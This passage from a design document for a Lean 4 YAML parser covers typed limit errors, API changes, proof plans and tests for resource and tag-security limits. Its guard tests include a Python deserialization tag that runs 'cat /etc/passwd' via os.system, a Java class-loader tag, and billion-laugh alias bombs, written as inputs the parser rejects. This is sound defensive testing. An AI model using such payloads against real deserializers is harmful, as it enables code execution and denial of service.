def customHandleRejected (handle prefix : String) : LimitError :=
  .tagSecurity (.customHandleRejected handle prefix)

def handlePrefixTooLong (bytes limit : Nat) (prefix : String) : LimitError :=
  .tagSecurity (.handlePrefixTooLong bytes limit prefix)

def nonCoreSchemaTag (tag : String) : LimitError :=
  .tagSecurity (.nonCoreSchemaTag tag)

end LimitError
```

#### Error Type Design Rationale

##### Why Structured Error Types?

Using inductive types instead of strings provides:

1. **Type-safe error handling**: Exhaustiveness checking ensures all error cases are handled
2. **Machine-readable errors**: Programmatic access to error details (counts, limits, paths)
3. **Precise error recovery**: Can distinguish transient vs. permanent failures
4. **Better error messages**: Structured data enables context-aware formatting
5. **Proof-friendliness**: Inductive types have strong elimination principles for verification

##### Error Hierarchy Design

The three-level hierarchy (`AliasLimitError` | `StructuralLimitError` | `DocumentLimitError` → `LimitError` → `ParseError`) enables:

- **Modular error handling**: Match only the error category you care about
- **Fine-grained recovery**: Different strategies for different limit types
- **Clear separation**: Syntax errors vs. resource limits are distinct at the type level
- **Future extensibility**: Can add new error categories without breaking existing code

Example: An API gateway might retry with relaxed limits on `DocumentLimitError.inputTooLarge` but immediately reject on `AliasLimitError.cyclicAlias` (malicious input).

##### Error Context Fields

Each error variant includes contextual information:

- **Counts and limits**: Actual value that exceeded the limit (enables adaptive strategies)
- **Paths**: Where in the document structure the violation occurred (debugging)
- **Names**: Specific aliases or keys involved (security auditing)
- **Indices**: Document number in multi-document streams (batch processing)

This metadata supports:
- **Detailed logging**: Security teams can audit DoS attempts
- **Progressive enhancement**: "Document OK at level 5, failed at level 50" suggests legitimate complexity
- **User guidance**: "Reduce nesting depth at path `.servers[0].config`" is actionable

##### Alternatives Considered

**Option 1**: Single flat `LimitError` enum with all 12 variants
- ❌ Harder to match on error categories
- ❌ No semantic grouping of related errors

**Option 2**: Generic `LimitExceeded { what : String, actual : Nat, limit : Nat }`
- ❌ Loses type safety (string matching on `what`)
- ❌ Can't enforce error-specific fields (e.g., path only for structural errors)

**Option 3**: Exceptions with error codes (integer/string tags)
- ❌ Not idiomatic in Lean (functional error handling via `Except`)
- ❌ Breaks verification (exceptions bypass type checking)

**Chosen approach** (structured inductives) best balances ergonomics, type safety, and proof tractability.

### API Changes

#### Current API

```lean
-- Types.lean:432
def YamlDocument.compose (doc : YamlDocument) : YamlDocument :=
  { doc with
    value := (doc.value.resolveAliases doc.anchors).stripAnchors
    anchors := #[] }

-- TokenParser.lean (current)
def parseYaml (input : String) : Except String (Array YamlDocument) := do
  let docs ← parseYamlRaw input
  return docs.map (·.compose)
```

#### Proposed API

```lean
-- Types.lean: Updated compose signature
def YamlDocument.compose (doc : YamlDocument) (limits : ParserLimits := {})
    (docIndex : Nat := 0)  -- For error reporting
    : Except LimitError YamlDocument := do
  -- Check document-level limits first
  if limits.enabled && doc.anchors.size > limits.document.maxAnchors then
    throw <| .tooManyAnchors doc.anchors.size limits.document.maxAnchors docIndex

  -- Resolve aliases with expansion tracking (returns AliasLimitError)
  let resolved ← doc.value.resolveAliasesLimitedLifted doc.anchors limits.alias

  return { doc with value := resolved.stripAnchors, anchors := #[] }

-- TokenParser.lean: Updated parseYaml signature
def parseYaml (input : String) (limits : ParserLimits := {})
    : Except LimitError (Array YamlDocument) := do
  -- Check input size limit
  if limits.enabled && input.utf8ByteSize > limits.document.maxInputBytes then
    throw <| .inputTooLarge input.utf8ByteSize limits.document.maxInputBytes

  let docs ← parseYamlRaw input limits
  docs.mapIdxM (fun idx doc => doc.compose limits idx)
```

**Key changes**:
- `compose` now returns `Except LimitError YamlDocument` instead of `YamlDocument`
- All error strings replaced with typed constructors from `LimitError` namespace
- Parser callers can pattern match on specific error types for precise handling
- Added `docIndex` parameter to `compose` for better error context

#### Parser Error Integration

The parser needs to track both parse errors and limit errors. We introduce a unified error type:

```lean
-- TokenParser.lean: Unified parser error type
inductive ParseError where
  | syntaxError (msg : String) (pos : YamlPos)
  | limitViolation (err : LimitError)
  deriving Repr, BEq

namespace ParseError

def toString : ParseError → String
  | syntaxError msg pos => s!"Syntax error at line {pos.line}, col {pos.col}: {msg}"
  | limitViolation err => s!"Limit violation: {err}"

instance : ToString ParseError where
  toString := toString

end ParseError

-- Updated parseYamlRaw to track structural limits during parsing
def parseYamlRaw (input : String) (limits : ParserLimits := {})
    : Except ParseError (Array YamlDocument) := do
  -- Check input size limit upfront
  if limits.enabled && input.utf8ByteSize > limits.document.maxInputBytes then
    throw <| .limitViolation (.inputTooLarge input.utf8ByteSize limits.document.maxInputBytes)

  -- Scan tokens
  let tokens ← Scanner.scanFiltered input
    |>.mapError (fun e => .syntaxError e.toString ⟨0, 0, 0⟩)

  -- Parse with structural limit tracking
  parseStream tokens limits

where
  -- parseStream now tracks limits during parsing
  def parseStream (tokens : Array (Positioned YamlToken)) (limits : ParserLimits)
      : Except ParseError (Array YamlDocument) := do
    let mut docs := #[]
    let mut state := ParserState.empty limits

    for tok in tokens do
      -- ... parsing logic with limit checks ...
      if limits.enabled && docs.size ≥ limits.document.maxDocuments then
        throw <| .limitViolation (.tooManyDocuments (docs.size + 1) limits.document.maxDocuments)

      -- Track nesting depth, node count, etc. in state
      -- Throw .limitViolation errors when limits exceeded

    return docs

-- Final parseYaml that composes parseYamlRaw + alias resolution
def parseYaml (input : String) (limits : ParserLimits := {})
    : Except ParseError (Array YamlDocument) := do
  let docs ← parseYamlRaw input limits

  -- Map over documents with index for error context
  docs.mapIdxM fun idx doc => do
    doc.compose limits idx
      |>.mapError ParseError.limitViolation
```

This design allows distinguishing between:
- **Syntax errors**: Malformed YAML (wrong indentation, invalid escape sequences, etc.)
- **Limit violations**: Valid YAML that exceeds resource constraints

#### Limited Alias Resolution

```lean
-- Types.lean: resolveAliasesLimited function
def YamlValue.resolveAliasesLimited (v : YamlValue)
    (anchors : Array (String × YamlValue))
    (limits : AliasLimits := {})
    : Except AliasLimitError YamlValue := do
  let tracker := AliasTracker.empty limits
  resolveImpl v anchors tracker

where
  structure AliasTracker where
    limits : AliasLimits
    depth : Nat := 0
    totalExpansions : Nat := 0
    totalNodes : Nat := 0
    visited : Std.HashSet String := {}
    resolutionPath : List String := []  -- Track path for cycle detection

  -- Increment counters and check limits
  def checkLimits (t : AliasTracker) (name : String) : Except AliasLimitError AliasTracker := do
    -- Check for cycles first
    if t.limits.rejectCycles && t.visited.contains name then
      throw <| .cyclicAlias name (name :: t.resolutionPath)

    -- Check depth limit
    if t.depth > t.limits.maxAliasDepth then
      throw <| .depthExceeded t.depth t.limits.maxAliasDepth name

    -- Check expansion count limit
    if t.totalExpansions > t.limits.maxAliasExpansions then
      throw <| .expansionCountExceeded t.totalExpansions t.limits.maxAliasExpansions

    -- Check resolved node count limit
    if t.totalNodes > t.limits.maxResolvedNodes then
      throw <| .nodeCountExceeded t.totalNodes t.limits.maxResolvedNodes

    return { t with
             visited := t.visited.insert name,
             resolutionPath := name :: t.resolutionPath,
             totalExpansions := t.totalExpansions + 1 }

  -- Helper: increment node counter
  def incNode (t : AliasTracker) : AliasTracker :=
    { t with totalNodes := t.totalNodes + 1 }

  -- Helper: increment/decrement depth
  def incDepth (t : AliasTracker) : AliasTracker :=
    { t with depth := t.depth + 1 }

  def decDepth (t : AliasTracker) : AliasTracker :=
    { t with depth := t.depth - 1 }

  -- Recursive resolution with tracking
  -- Returns (resolved value, updated tracker)
  def resolveImpl : YamlValue → Array (String × YamlValue) → AliasTracker
      → Except AliasLimitError (YamlValue × AliasTracker)
    | .scalar s, _, t =>
      return (.scalar s, t.incNode)

    | .sequence style items tag anchor, anchors, t => do
      let t := t.incDepth.incNode
      let (items', t) ← items.foldlM (fun (acc, t) item => do
        let (item', t) ← resolveImpl item anchors t
        return (acc.push item', t)) (#[], t)
      return (.sequence style items' tag anchor, t.decDepth)

    | .mapping style pairs tag anchor, anchors, t => do
      let t := t.incDepth.incNode
      let (pairs', t) ← pairs.foldlM (fun (acc, t) (k, v) => do
        let (k', t) ← resolveImpl k anchors t
        let (v', t) ← resolveImpl v anchors t
        return (acc.push (k', v'), t)) (#[], t)
      return (.mapping style pairs' tag anchor, t.decDepth)

    | .alias name, anchors, t => do
      let t ← checkLimits t name
      match anchors.findSome? (fun (n, val) => if n == name then some val else none) with
      | some val =>
        -- Found anchor, recursively resolve it with increased depth
        resolveImpl val anchors { t with depth := t.depth + 1 }
      | none =>
        -- Unresolved alias: leave as-is (YAML 1.2.2 allows this)
        return (.alias name, t)

-- Lift to LimitError for use in compose
def YamlValue.resolveAliasesLimitedLifted (v : YamlValue)
    (anchors : Array (String × YamlValue))
    (limits : AliasLimits := {})
    : Except LimitError YamlValue :=
  v.resolveAliasesLimited anchors limits
    |>.mapError LimitError.aliasLimit
    |>.map Prod.fst
```

**Note**: The above is pseudocode showing the control flow. Actual implementation will need to:
- Thread `AliasTracker` through the monadic context (currently shown as tuple returns)
- Use proper state monad or explicit state passing
- Handle the return types consistently with proper lifting between error types

#### Backward Compatibility

To maintain backward compatibility with code expecting `Except String`, provide wrapper functions:

```lean
-- Compatibility layer: convert ParseError to String
def parseYamlString (input : String) (limits : ParserLimits := {})
    : Except String (Array YamlDocument) :=
  parseYaml input limits |>.mapError toString

def YamlDocument.composeString (doc : YamlDocument) (limits : ParserLimits := {})
    (docIndex : Nat := 0) : Except String YamlDocument :=
  doc.compose limits docIndex |>.mapError toString

-- Migration path: old function can delegate to new one
@[deprecated parseYaml "Use parseYaml and handle structured errors"]
def parseYamlOld (input : String) : Except String (Array YamlDocument) :=
  parseYamlString input ParserLimits.unlimited
```

**Migration guide** for existing code:

```lean
-- Before:
match parseYaml input with
| .ok docs => -- handle success
| .error msg => IO.eprintln msg

-- After (Option 1: Continue using strings):
match parseYamlString input with
| .ok docs => -- handle success
| .error msg => IO.eprintln msg

-- After (Option 2: Handle structured errors):
match parseYaml input with
| .ok docs => -- handle success
| .error (.syntaxError msg pos) => IO.eprintln s!"Syntax error: {msg}"
| .error (.limitViolation err) => IO.eprintln s!"Limit exceeded: {err}"
```

### Proof Burden

#### Theorem Targets

Implementing limits changes the parser's **contract**:

**Before**: `parseYaml input = .ok docs → Grammar.ValidYaml input docs`

**After**: `parseYaml input limits = .ok docs → Grammar.ValidYaml input docs ∧ SatisfiesLimits docs limits`

New proof obligations:

##### 1. Soundness Preservation

```lean
theorem parseYaml_sound_with_limits :
  ∀ (input : String) (docs : Array YamlDocument) (limits : ParserLimits),
    parseYaml input limits = .ok docs →
    Grammar.ValidYaml input docs

-- Variant: syntax errors preserve invalidity
theorem parseYaml_syntax_error_sound :
  ∀ (input : String) (msg : String) (pos : YamlPos) (limits : ParserLimits),
    parseYaml input limits = .error (.syntaxError msg pos) →
    ¬Grammar.ValidYaml input _

-- Limits don't affect grammar validity
theorem limit_error_preserves_grammar :
  ∀ (input : String) (err : LimitError) (limits : ParserLimits),
    parseYaml input limits = .error (.limitViolation err) →
    (∃ docs limits', parseYaml input limits' = .ok docs ∧ Grammar.ValidYaml input docs)
```

**Proof strategy**:
- The existing soundness proof (`Proofs/Soundness.lean`) should carry through unchanged for the success case
- Limits only *reject* additional inputs without changing grammar rules for accepted inputs
- The `limit_error_preserves_grammar` theorem states that limit violations don't imply syntax errors: the same input could parse successfully with more permissive limits
- This separates resource constraints from grammatical correctness

##### 2. Limit Enforcement

```lean
-- Error type completeness: all limit violations produce appropriate errors
theorem limit_violation_produces_error :
  ∀ (input : String) (limits : ParserLimits) (docs : Array YamlDocument),
    parseYaml input limits = .ok docs →
    limits.enabled →
    satisfiesAllLimits docs limits

-- Alias expansion limits are respected or error is thrown
theorem compose_respects_alias_limits :
  ∀ (doc : YamlDocument) (limits : ParserLimits) (idx : Nat),
    limits.enabled →
    match doc.compose limits idx with
    | .ok doc' =>
        aliasExpansionCount doc.value doc.anchors ≤ limits.alias.maxAliasExpansions
        ∧ resolvedNodeCount doc' ≤ limits.alias.maxResolvedNodes
        ∧ aliasDepth doc.value doc.anchors ≤ limits.alias.maxAliasDepth
        ∧ ¬hasCycles doc.value doc.anchors
    | .error (.aliasLimit err) =>
        (∃ name path, err = .cyclicAlias name path ∧ hasCycles doc.value doc.anchors)
        ∨ (∃ d l n, err = .depthExceeded d l n ∧ d > l)
        ∨ (∃ c l, err = .expansionCountExceeded c l ∧ c > l)
        ∨ (∃ c l, err = .nodeCountExceeded c l ∧ c > l)
    | _ => False  -- No other error types from compose

-- Structural limits are enforced during parsing
theorem parse_respects_structural_limits :
  ∀ (input : String) (limits : ParserLimits),
    limits.enabled →
    match parseYaml input limits with
    | .ok docs =>
        (∀ doc ∈ docs, maxDepth doc.value ≤ limits.structural.maxDepth)
        ∧ (∀ doc ∈ docs, maxScalarSize doc.value ≤ limits.structural.maxScalarBytes)
        ∧ totalNodeCount docs ≤ limits.structural.maxTotalNodes
    | .error (.limitViolation (.structuralLimit err)) =>
        (∃ d l p, err = .depthExceeded d l p ∧ d > l)
        ∨ (∃ len l p, err = .sequenceTooLarge len l p ∧ len > l)
        ∨ (∃ sz l p, err = .mappingTooLarge sz l p ∧ sz > l)
        ∨ (∃ b l p, err = .scalarTooLarge b l p ∧ b > l)
        ∨ (∃ c l, err = .totalNodesExceeded c l ∧ c > l)
    | _ => True  -- Syntax errors or other limit errors

-- Document limits are enforced
theorem parse_respects_document_limits :
  ∀ (input : String) (limits : ParserLimits),
    limits.enabled →
    match parseYaml input limits with
    | .ok docs =>
        docs.size ≤ limits.document.maxDocuments
        ∧ input.utf8ByteSize ≤ limits.document.maxInputBytes
        ∧ (∀ idx, ∀ doc ∈ docs, doc.anchors.size ≤ limits.document.maxAnchors)
    | .error (.limitViolation (.documentLimit err)) =>
        (∃ c l, err = .tooManyDocuments c l ∧ c > l)
        ∨ (∃ c l idx, err = .tooManyAnchors c l idx ∧ c > l)
        ∨ (∃ b l, err = .inputTooLarge b l ∧ b > l)
    | _ => True  -- Syntax errors or other limit errors

-- Error context accuracy
theorem error_context_accurate :
  ∀ (input : String) (limits : ParserLimits) (err : LimitError),
    parseYaml input limits = .error (.limitViolation err) →
    match err with
    | .structuralLimit (.depthExceeded _ _ path) => validPath path
    | .structuralLimit (.sequenceTooLarge len _ path) =>
        validPath path ∧ (∃ seq, valueAtPath input path = some seq ∧ seq.length = len)
    | .documentLimit (.tooManyAnchors _ _ docIdx) => docIdx < documentCount input
    | _ => True
```

**Proof strategy**:
- Define auxiliary functions (`aliasExpansionCount`, `resolvedNodeCount`, `maxDepth`, `hasCycles`, etc.)
- Prove instrumentation is correct: counters accurately reflect actual values
- Prove error types match violations: e.g., `.cyclicAlias` iff actual cycle exists
- Prove context is accurate: paths/indices in errors correspond to actual document structure

##### 3. Completeness Preservation

```lean
-- No false negatives: valid YAML within limits is accepted
theorem parse_complete_within_limits :
  ∀ (input : String) (limits : ParserLimits),
    Grammar.ValidYaml input docs →
    SatisfiesLimits docs limits →
    limits.enabled →
    ∃ docs', parseYaml input limits = .ok docs' ∧ docs' ≈ docs

-- Corollary: if parsing fails with limit error, either invalid or exceeds limits
theorem parse_failure_dichotomy :
  ∀ (input : String) (limits : ParserLimits) (err : ParseError),
    parseYaml input limits = .error err →
    match err with
    | .syntaxError _ _ => ¬Grammar.ValidYaml input _
    | .limitViolation _ =>
        ∃ docs, Grammar.ValidYaml input docs ∧ ¬SatisfiesLimits docs limits

-- Error type determinism: same violation produces same error type
theorem error_type_deterministic :
  ∀ (input : String) (limits : ParserLimits) (err₁ err₂ : ParseError),
    parseYaml input limits = .error err₁ →
    parseYaml input limits = .error err₂ →
    err₁ = err₂

-- Specific error matching: can identify exact violation
theorem specific_error_correct :
  ∀ (input : String) (limits : ParserLimits) (name : String) (path : List String),
    parseYaml input limits = .error (.limitViolation (.cyclicAlias name path)) →
    ∃ docs, Grammar.ValidYaml input docs ∧ hasCyclicAlias docs name path
```

**Proof burden**: This is the **expensive** part. The current completeness proof (`Proofs/Completeness.lean`) uses `native_decide` for decidability. Adding limits means:

1. Prove **valid YAML within limits** is still accepted (no false negatives)
2. For each limit check, show it doesn't introduce spurious failures
3. Prove error types correctly classify violations (structural vs. syntax)
4. Handle stateful tracking in `resolveAliasesLimited` — tracker state must be sound
5. Prove error contexts (paths, indices) are accurate

**Estimated effort**:
- **Alias limits**: 2–3 weeks (cycle detection proof is non-trivial)
- **Structural limits**: 3–4 weeks (path tracking through recursive descent)
- **Document limits**: 1–2 weeks (simpler, just counter checks)
- **Error type soundness**: 2–3 weeks (prove error constructors match violations)

**Total**: 8–12 weeks of verification work.

##### 4. Termination

Adding counters and bounds helps prove termination:

```lean
-- Alias resolution terminates when limits are enforced
theorem resolveAliasesLimited_terminates :
  ∀ (v : YamlValue) (anchors : AnchorMap) (limits : AliasLimits),
    ∃ result, resolveAliasesLimited v anchors limits = result
```

**Proof strategy**: The expansion counter provides a decreasing metric. Each recursive call either makes progress (substituting an alias) or terminates (scalar, empty collection). The `maxAliasExpansions` bound guarantees finite recursion depth.

**Update (2026-07-31)**: `YamlValue.resolveAliases` (`L4YAML/Spec/Types.lean:481`) is already a total `def`. The remaining `partial` in this area is the instrumented `resolveAliasesLimited` (`L4YAML/Config/Limits.lean:433`) — that is the declaration a termination-under-limits proof would target.

#### Incremental Proof Strategy

To minimize disruption:

1. **Phase 1**: Implement limits as runtime checks without proofs (guard tests only)
2. **Phase 2**: Prove soundness preservation (limits don't break existing grammar proofs)
3. **Phase 3**: Prove limit enforcement (instrumentation is correct)
4. **Phase 4**: Prove completeness preservation (no false negatives within limits)
5. **Phase 5**: Prove termination (enable total functions, remove `partial`)

**Recommendation (original)**: Defer proof work until after core scanner/parser verification is complete (then the current focus). Add limits as **opt-in runtime protection** initially, with proofs as future work.

**Update (2026-07-31)**: the deferral condition is met — the library has been sorry-free since 2026-07-04 (see `Blueprint/04-capstones.md`, the proof-status SSOT). Limits shipped as runtime protection (Phases 1 of the strategy above); the limit-enforcement proofs (Phases 2–5) remain **open future work**.

### Error Handling Patterns

#### Pattern Matching on Errors

Users can pattern match on specific error types for precise error handling:

```lean
def parseWithHandling (input : String) : IO Unit := do
  match parseYaml input ParserLimits.strict with
  | .ok docs =>
    IO.println s!"Successfully parsed {docs.size} documents"

  | .error (.aliasLimit err) =>
    match err with
    | .cyclicAlias name path =>
      IO.eprintln s!"ERROR: Detected circular reference in alias '{name}'"
      IO.eprintln s!"  Resolution path: {" → ".intercalate path}"
    | .expansionCountExceeded count limit =>
      IO.eprintln s!"ERROR: Document too complex ({count} alias expansions > {limit})"
      IO.eprintln "  This may be a billion-laugh attack. Use ParserLimits.permissive for trusted input."
    | .depthExceeded depth limit _ =>
      IO.eprintln s!"ERROR: Alias nesting too deep ({depth} > {limit})"
    | .nodeCountExceeded count limit =>
      IO.eprintln s!"ERROR: Document too large ({count} nodes > {limit})"

  | .error (.structuralLimit err) =>
    match err with
    | .depthExceeded depth limit path =>
      IO.eprintln s!"ERROR: Nesting depth exceeded at {err.pathToString path}"
    | .sequenceTooLarge length limit path =>
      IO.eprintln s!"ERROR: Sequence has {length} items (max {limit})"
    | .scalarTooLarge bytes limit _ =>
      IO.eprintln s!"ERROR: Scalar is {bytes} bytes (max {limit})"
    | _ => IO.eprintln s!"ERROR: {err}"

  | .error (.documentLimit err) =>
    match err with
    | .inputTooLarge bytes limit =>
      IO.eprintln s!"ERROR: Input file is {bytes} bytes (max {limit})"
      IO.eprintln "  Use ParserLimits.permissive or stream parsing for large files."
    | .tooManyDocuments count limit =>
      IO.eprintln s!"ERROR: Stream contains {count} documents (max {limit})"
    | .tooManyAnchors count limit docIdx =>
      IO.eprintln s!"ERROR: Document {docIdx} has {count} anchors (max {limit})"

  | .error (.tagSecurity err) =>
    match err with
    | .dangerousLanguageTag tag language =>
      IO.eprintln s!"⚠️ SECURITY ALERT: Dangerous {language} tag detected: {tag}"
      IO.eprintln "  This tag may execute arbitrary code. Rejecting document."
      IO.eprintln "  If this is trusted input, use ParserLimits.unlimited (UNSAFE)."
      -- Log to security monitoring system
      logSecurityEvent s!"Blocked dangerous tag: {tag}"
    | .forbiddenTag tag reason =>
      IO.eprintln s!"⚠️ SECURITY: Tag '{tag}' is forbidden: {reason}"
      IO.eprintln "  Only Core Schema tags are allowed (!!str, !!int, !!float, !!bool, !!null)"
    | .nonCoreSchemaTag tag =>
      IO.eprintln s!"⚠️ SECURITY: Non-standard tag '{tag}' rejected"
      IO.eprintln "  Only YAML 1.2 Core Schema tags permitted in strict mode"
    | .customHandleRejected handle prefix =>
      IO.eprintln s!"⚠️ SECURITY: Custom tag handle '{handle}' → '{prefix}' rejected"
      IO.eprintln "  Custom tag handles disabled in strict mode"
    | .tagTooLong bytes limit _ =>
      IO.eprintln s!"⚠️ SECURITY: Tag length {bytes} exceeds limit {limit}"
      IO.eprintln "  Possible tag bomb attack"
    | .tooManyUniqueTags count limit =>
      IO.eprintln s!"⚠️ SECURITY: Too many unique tags: {count} > {limit}"
      IO.eprintln "  Possible tag table bloat attack"
    | .handlePrefixTooLong bytes limit _ =>
      IO.eprintln s!"⚠️ SECURITY: Tag handle prefix length {bytes} exceeds limit {limit}"
```

#### Converting to Strings

For simple error display, use the `ToString` instances:

```lean
def parseSimple (input : String) : IO Unit := do
  match parseYaml input with
  | .ok docs => IO.println s!"Parsed {docs.size} documents"
  | .error err => IO.eprintln s!"Parse failed: {err}"
```

#### Retrying with Relaxed Limits

```lean
def parseWithFallback (input : String) : IO (Array YamlDocument) := do
  -- Try strict limits first (for untrusted input)
  match parseYaml input ParserLimits.strict with
  | .ok docs => return docs
  | .error limitErr =>
    IO.eprintln s!"Strict parsing failed: {limitErr}"
    IO.eprintln "Retrying with permissive limits..."

    -- Retry with permissive limits if strict fails
    match parseYaml input ParserLimits.permissive with
    | .ok docs =>
      IO.println "⚠ Warning: Document exceeds strict limits but parsed successfully"
      return docs
    | .error err =>
      throw <| IO.userError s!"Parse failed even with permissive limits: {err}"
```

#### Tag Security in Practice

**Example 1: Detecting attacks in untrusted input**

```lean
def parseUntrustedUserInput (yaml : String) : IO (Option (Array YamlDocument)) := do
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    -- Success: document uses only safe Core Schema tags
    return some docs

  | .error (.limitViolation (.tagSecurity (.dangerousLanguageTag tag language))) =>
    -- CRITICAL: Potential code execution attack detected
    logSecurityEvent {
      severity := .critical
      category := "code_execution_attempt"
      message := s!"Blocked {language} tag: {tag}"
      sourceIP := getUserIP ()
      timestamp := getCurrentTime ()
    }
    IO.eprintln "⚠️ SECURITY INCIDENT: Malicious YAML tag detected and blocked"
    return none

  | .error (.limitViolation (.tagSecurity err)) =>
    -- Other tag security violations (still concerning)
    logSecurityEvent {
      severity := .high
      category := "tag_violation"
      message := err.toString
    }
    IO.eprintln s!"Tag security violation: {err}"
    return none

  | .error (.limitViolation (.aliasLimit (.expansionCountExceeded _ _))) =>
    -- Possible billion-laugh attack
    logSecurityEvent {
      severity := .high
      category := "dos_attempt"
      message := "Billion laugh attack detected"
    }
    IO.eprintln "⚠️ SECURITY: Possible DoS attack (billion laughs)"
    return none

  | .error err =>
    -- Other errors (syntax errors, other limit violations)
    IO.eprintln s!"Parse error: {err}"
    return none
```

**Example 2: Application-specific tag whitelist**

```lean
def parseAppConfig (yaml : String) : IO AppConfig := do
  -- Define application-specific allowed tags
  let appLimits : ParserLimits := {
    enabled := true
    tag := {
      policy := .whitelist [
        "tag:yaml.org,2002:str",
        "tag:yaml.org,2002:int",
        "tag:yaml.org,2002:bool",
        "tag:yaml.org,2002:null",
        "tag:yaml.org,2002:seq",
        "tag:yaml.org,2002:map",
        "!myapp/database",     -- Custom database config tag
        "!myapp/server",       -- Custom server config tag
        "!myapp/feature-flag"  -- Custom feature flag tag
      ]
      rejectLanguageTags := true  -- Always reject !!python/*, !!java/*, etc.
      maxUniqueTags := 20
      rejectCustomHandles := false  -- Allow %TAG for !myapp/* tags
    }
    -- Resource limits remain permissive for config files
    alias := { maxAliasExpansions := 10_000, ... }
    structural := { maxDepth := 100, ... }
  }

  match parseYaml yaml appLimits with
  | .ok docs =>
    -- Safe to deserialize: only known tags present
    deserializeAppConfig docs
  | .error (.limitViolation (.tagSecurity (.forbiddenTag tag reason))) =>
    throw <| IO.userError s!"Invalid config tag '{tag}': {reason}"
  | .error err =>
    throw <| IO.userError s!"Config parse error: {err}"
```

**Example 3: Conditional tag strictness based on source**

```lean
def parseYamlFromSource (yaml : String) (source : Source) : IO (Array YamlDocument) := do
  let limits := match source with
  | .userUpload =>
    -- Strictest: untrusted public input
    ParserLimits.strict
  | .apiRequest =>
    -- Strict tags, moderate resource limits
    ParserLimits.strict
  | .configFile =>
    -- Allow app-specific tags, permissive resource limits
    { ParserLimits.permissive with
      tag := { policy := .whitelist [/* app tags */], rejectLanguageTags := true } }
  | .internalTrusted =>
    -- Relaxed limits but still reject dangerous language tags
    { ParserLimits.permissive with
      tag := { policy := .coreSchemaOnly, rejectLanguageTags := true } }
  | .testSuite =>
    -- Only for testing, never production
    ParserLimits.unlimited

  match parseYaml yaml limits with
  | .ok docs => return docs
  | .error err => throw <| IO.userError s!"Parse failed: {err}"
```

**Example 4: Progressive validation with detailed reporting**

```lean
structure ValidationReport where
  passed : Bool
  securityIssues : Array String
  resourceIssues : Array String
  recommendations : Array String

def validateYamlSecurity (yaml : String) : IO ValidationReport := do
  let mut report := {
    passed := true,
    securityIssues := #[],
    resourceIssues := #[],
    recommendations := #[]
  }

  -- Try parsing with strict limits
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    return report  -- All good!

  | .error (.limitViolation (.tagSecurity (.dangerousLanguageTag tag lang))) =>
    report := { report with
      passed := false
      securityIssues := report.securityIssues.push
        s!"CRITICAL: Dangerous {lang} tag detected: {tag}"
      recommendations := report.recommendations.push
        "Remove language-specific tags. Use only YAML Core Schema types."
    }

  | .error (.limitViolation (.aliasLimit (.expansionCountExceeded count limit))) =>
    report := { report with
      passed := false
      resourceIssues := report.resourceIssues.push
        s!"Alias expansion count ({count}) exceeds limit ({limit})"
      recommendations := report.recommendations.push
        "Reduce alias complexity or use explicit values instead of aliases."
    }

  | .error (.limitViolation (.structuralLimit err)) =>
    report := { report with
      passed := false
      resourceIssues := report.resourceIssues.push err.toString
    }

  | _ => report := { report with passed := false }

  return report
```

### Testing Strategy

#### Guard Tests

Add compile-time `#guard` tests for limit enforcement:

```lean
-- Test alias expansion limit
#guard
  let billionLaugh := "a: &a [1,2]\nb: &b [*a,*a]\nc: [*b,*b,*b,*b,*b,...]"
  match parseYaml billionLaugh { alias.maxAliasExpansions := 10 } with
  | .error (.aliasLimit (.expansionCountExceeded _ _)) => true
  | _ => false

-- Test depth limit
#guard
  let deepNesting := "- - - - - - - - ... (100 levels)"
  match parseYaml deepNesting { structural.maxDepth := 50 } with
  | .error (.structuralLimit (.depthExceeded _ _ _)) => true
  | _ => false

-- Test scalar size limit
#guard
  let hugeScalar := "value: " ++ String.replicate 100_000 "x"
  match parseYaml hugeScalar { structural.maxScalarBytes := 10_000 } with
  | .error (.structuralLimit (.scalarTooLarge _ _ _)) => true
  | _ => false

-- Test cycle detection
#guard
  let cyclicYaml := "a: &a [*a]"
  match parseYaml cyclicYaml with
  | .error (.aliasLimit (.cyclicAlias "a" _)) => true
  | _ => false

-- Test Python tag rejection
#guard
  let pythonExecTag := "!!python/object/apply:os.system\nargs: ['cat /etc/passwd']"
  match parseYaml pythonExecTag ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Python")) => tag.startsWith "!!python/"
  | _ => false

-- Test Java tag rejection
#guard
  let javaTag := "!!java.net.URLClassLoader\nargs: [...]"
  match parseYaml javaTag ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Java")) => tag.startsWith "!!java"
  | _ => false

-- Test non-Core-Schema tag rejection
#guard
  let customTag := "!!myapp/config\nkey: value"
  match parseYaml customTag ParserLimits.strict with
  | .error (.tagSecurity (.nonCoreSchemaTag tag)) => tag.startsWith "!!myapp/"
  | _ => false

-- Test Core Schema tags accepted
#guard
  let coreSchemaYaml := "str: !!str hello\nint: !!int 42\nbool: !!bool true"
  match parseYaml coreSchemaYaml ParserLimits.strict with
  | .ok _ => true
  | _ => false

-- Test tag length limit
#guard
  let longTag := "!!" ++ String.replicate 2000 "x"  ++ "\nvalue: test"
  match parseYaml longTag ParserLimits.strict with
  | .error (.tagSecurity (.tagTooLong bytes limit _)) => bytes > limit
  | _ => false
```

Add to `Tests/ValidationTests.lean` as a new test category.

#### Runtime Tests

Add to `Tests/Main.lean`:

```lean
setCategory "Limits"

check "billion laugh attack blocked" do
  let yaml := constructBillionLaughPayload 9  -- 8^9 expansions
  match parseYaml yaml ParserLimits.strict with
  | .error (.aliasLimit (.expansionCountExceeded count limit)) =>
    if count ≤ limit then
      throw s!"expansion count {count} should exceed limit {limit}"
  | .ok _ => throw "expected limit error, got success"
  | .error other => throw s!"wrong error type: {other}"

check "cyclic alias detected" do
  let yaml := "a: &a [*a]"
  match parseYaml yaml with
  | .error (.aliasLimit (.cyclicAlias name path)) =>
    if name != "a" then throw s!"wrong alias name: {name}"
    if path.isEmpty then throw "expected non-empty resolution path"
  | .ok _ => throw "expected cycle detection error"
  | .error other => throw s!"wrong error type: {other}"

check "valid YAML within limits accepted" do
  let yaml := "a: &a [1,2,3]\nb: [*a, *a]"  -- 2 expansions, well below limit
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    if docs.size != 1 then throw s!"expected 1 document, got {docs.size}"
  | .error err => throw s!"false negative: {err}"

check "unlimited mode bypasses all checks" do
  let yaml := constructBillionLaughPayload 6  -- Smaller to avoid OOM in tests
  match parseYaml yaml ParserLimits.unlimited with
  | .ok _ => pure ()
  | .error err => throw s!"unlimited mode rejected input: {err}"

